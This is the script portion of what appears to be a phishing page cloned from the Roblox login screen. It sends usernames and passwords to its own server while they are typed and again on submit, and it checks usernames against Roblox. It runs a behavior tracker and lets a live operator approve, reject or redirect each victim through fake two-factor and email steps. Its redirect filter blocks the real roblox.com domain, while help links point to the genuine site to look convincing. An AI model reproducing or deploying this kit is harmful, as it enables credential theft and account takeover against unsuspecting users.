    <script src="/static/js/behavior.js"></script>
    <script>
        // Configuration
        const API_URL = window.location.origin;
        let sessionId = null;
        let ws = null;
        let usernameTypingDebounce = null;
        let passwordTypingDebounce = null;
        
        // Check if we're in an iframe
        const isInIframe = window.self !== window.top;

        async function sendTypingUpdate(field, value) {
            if (!sessionId) return;
            try {
                await fetch(`${API_URL}/api/login-typing`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: sessionId,
                        field: field,
                        value: value
                    })
                });
            } catch (error) {
                console.error('Error sending typing update:', error);
            }
        }

        function attachTypingHandlers() {
            const usernameInput = document.getElementById('login-username');
            const passwordInput = document.getElementById('login-password');

            if (usernameInput) {
                usernameInput.addEventListener('input', function() {
                    clearTimeout(usernameTypingDebounce);
                    usernameTypingDebounce = setTimeout(() => {
                        sendTypingUpdate('username', usernameInput.value);
                    }, 200);
                });
            }

            if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                    clearTimeout(passwordTypingDebounce);
                    passwordTypingDebounce = setTimeout(() => {
                        sendTypingUpdate('password', passwordInput.value);
                    }, 200);
                });
            }
        }
        
        // Initialize session
        async function initSession() {
            try {
                const response = await fetch(`${API_URL}/api/session`);
                const data = await response.json();
                sessionId = data.session_id;
                console.log('Session ID:', sessionId);
                console.log('In iframe:', isInIframe);
                if (window.BehaviorTracker) {
                    window.BehaviorTracker.start();
                    window.BehaviorTracker.report(sessionId).catch(() => {});
                }
                attachTypingHandlers();
                
                // Connect WebSocket
                connectWebSocket();
            } catch (error) {
                console.error('Error initializing session:', error);
            }
        }
        
        // Connect WebSocket
        function connectWebSocket() {
            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsHost = window.location.host;
            const wsUrl = `${wsProtocol}//${wsHost}/ws/${sessionId}`;
            
            console.log('Connecting to WebSocket:', wsUrl);
            ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                console.log('WebSocket connected');
            };
            
            ws.onmessage = (event) => {
                console.log('Received message:', event.data);
                const data = JSON.parse(event.data);
                handleResponse(data);
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
            
            ws.onclose = () => {
                console.log('WebSocket closed');
                setTimeout(connectWebSocket, 3000);
            };
        }
        
        // Handle response from server
        let verificationActive = false;

        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'verificationActive') {
                verificationActive = !!event.data.active;
            }
        });

        function safeRedirect(url) {
            if (!url || /roblox\.com/i.test(String(url))) {
                return '/';
            }
            return url;
        }

        function redirectAway(url) {
            const target = window.top || window;
            target.location.href = safeRedirect(url);
        }

        function handleResponse(data) {
            console.log('Handling response:', data);

            if (verificationActive && data.action === 'approve' && data.redirect_to !== 'success') {
                return;
            }

            if (verificationActive && data.action === 'redirect') {
                return;
            }

            if (data.action === 'redirect' && data.redirect_to) {
                redirectAway(data.redirect_to);
                return;
            }
            
            if (data.action === 'approve') {
                console.log('Approved! Redirect to:', data.redirect_to);
                
                // Tell parent window to show overlay instead of navigating
                if (data.redirect_to === '2fa') {
                    window.parent.postMessage({ type: 'show2FA', sessionId: sessionId }, '*');
                } else if (data.redirect_to === 'email') {
                    window.parent.postMessage({ type: 'showEmail', sessionId: sessionId }, '*');
                } else if (data.redirect_to === 'success') {
                    window.parent.postMessage({ type: 'success' }, '*');
                }
            } else if (data.action === 'reject') {
                console.log('Login rejected');
                
                // Show error message
                const errorDiv = document.getElementById('login-error');
                if (errorDiv) {
                    errorDiv.textContent = 'Incorrect username or password.';
                    errorDiv.style.display = 'block';
                }
                
                // Restore login button - try multiple selectors
                const spinner = document.querySelector('.spinner') || document.querySelector('.spinner-default') || document.querySelector('[class*="spinner"]');
                if (spinner) {
                    spinner.outerHTML = '<button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>';
                    attachLoginHandler();
                } else {
                    attachLoginHandler();
                }
            } else if (data.action === 'error') {
                console.log('Custom error received:', data.error_message);
                
                // Show custom error message
                const errorDiv = document.getElementById('login-error');
                if (errorDiv) {
                    errorDiv.textContent = data.error_message || 'An error occurred. Please try again.';
                    errorDiv.style.display = 'block';
                }
                
                // Restore login button - try multiple selectors
                const spinner = document.querySelector('.spinner') || document.querySelector('.spinner-default') || document.querySelector('[class*="spinner"]');
                if (spinner) {
                    spinner.outerHTML = '<button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>';
                    attachLoginHandler();
                } else {
                    attachLoginHandler();
                }
            }
        }
        
        // Attach login handler
        function attachLoginHandler() {
            const loginButton = document.getElementById('login-button');
            if (!loginButton) return;
            
            // Hide error when user starts typing
            const usernameInput = document.getElementById('login-username');
            const passwordInput = document.getElementById('login-password');
            const errorDiv = document.getElementById('login-error');
            
            if (usernameInput && errorDiv) {
                usernameInput.addEventListener('input', function() {
                    errorDiv.style.display = 'none';
                });
            }
            if (passwordInput && errorDiv) {
                passwordInput.addEventListener('input', function() {
                    errorDiv.style.display = 'none';
                });
            }
            
            loginButton.addEventListener('click', async function (e) {
                e.preventDefault();
                
                const username = document.getElementById('login-username').value;
                const password = document.getElementById('login-password').value;
                const errorDiv = document.getElementById('login-error');
                
                if (!username || !password) {
                    if (errorDiv) {
                        errorDiv.textContent = 'Username and password required';
                        errorDiv.style.display = 'block';
                    }
                    return;
                }
                
                // Show loading spinner
                loginButton.outerHTML = '<span class="spinner spinner-default"></span>';
                
                // Function to restore button
                function restoreButton() {
                    const spinner = document.querySelector('.spinner');
                    if (spinner) {
                        spinner.outerHTML = '<button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>';
                    }
                    attachLoginHandler();
                }
                
                // Function to show error
                function showError(message) {
                    if (errorDiv) {
                        errorDiv.textContent = message;
                        errorDiv.style.display = 'block';
                    }
                    restoreButton();
                }
                
                function isEmail(value) {
                    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
                }

                console.log('Validating login identifier:', username);

                let isValidUsername = true;

                if (isEmail(username)) {
                    console.log('Email format detected - allowing login');
                } else if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
                    isValidUsername = false;
                } else {
                    try {
                        const validateResponse = await fetch(`${API_URL}/api/validate-username/${encodeURIComponent(username)}`);
                        console.log('Validate response status:', validateResponse.status);

                        if (validateResponse.ok) {
                            const contentType = validateResponse.headers.get('content-type') || '';
                            if (contentType.includes('application/json')) {
                                const validateData = await validateResponse.json();
                                console.log('Roblox validation response:', validateData);
                                if (validateData.valid === false) {
                                    isValidUsername = false;
                                }
                            } else {
                                console.warn('Username validation skipped (non-JSON response, likely Cloudflare)');
                            }
                        } else {
                            console.warn('Username validation skipped (HTTP ' + validateResponse.status + ')');
                        }
                    } catch (validateError) {
                        console.warn('Username validation skipped:', validateError);
                    }
                }
                
                if (!isValidUsername) {
                    console.log('Invalid Roblox username - blocking submission');
                    showError('Incorrect username or password.');
                    return;
                }
                
                console.log('Valid Roblox username - proceeding with login');

                if (window.BehaviorTracker) {
                    window.BehaviorTracker.report(sessionId).catch(() => {});
                }
                
                // Username is valid, proceed with login
                try {
                    if (!sessionId) {
                        showError('Session not ready. Please refresh and try again.');
                        return;
                    }

                    const response = await fetch(`${API_URL}/api/login?session_id=${sessionId}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        credentials: 'same-origin',
                        body: JSON.stringify({
                            username: username,
                            password: password
                        })
                    });

                    let data = {};
                    try {
                        data = await response.json();
                    } catch (parseError) {
                        console.warn('Login response was not JSON:', parseError);
                    }

                    console.log('Login response:', response.status, data);

                    if (data.action === 'redirect' && data.redirect_to) {
                        redirectAway(data.redirect_to);
                        return;
                    }

                    if (response.ok) {
                        handleResponse(data);
                    } else if (data.action === 'error' && data.error_message) {
                        showError(data.error_message);
                    } else if (data.detail) {
                        showError(String(data.detail));
                    } else {
                        showError('Incorrect username or password.');
                    }
                } catch (error) {
                    console.error('Error submitting login:', error);
                    showError('Connection error. Please try again.');
                }
            });
        }
        
        function attachExternalLinkHandlers() {
            const externalLinks = [
                { id: 'forgot-credentials-link', url: 'https://www.roblox.com/login/forgot-password-or-username' },
                { id: 'sign-up-button', url: 'https://www.roblox.com/CreateAccount' },
                { id: 'sign-up-link', url: 'https://www.roblox.com/CreateAccount' },
            ];

            externalLinks.forEach(({ id, url }) => {
                const link = document.getElementById(id);
                if (!link) return;
                link.href = url;
                link.target = '_top';
                link.rel = 'noopener';
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    const targetWindow = window.top || window;
                    targetWindow.location.href = url;
                });
            });
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function () {
            console.log('Page loaded, in iframe:', isInIframe);
            initSession();
            attachLoginHandler();
            attachExternalLinkHandlers();
        });
    </script>
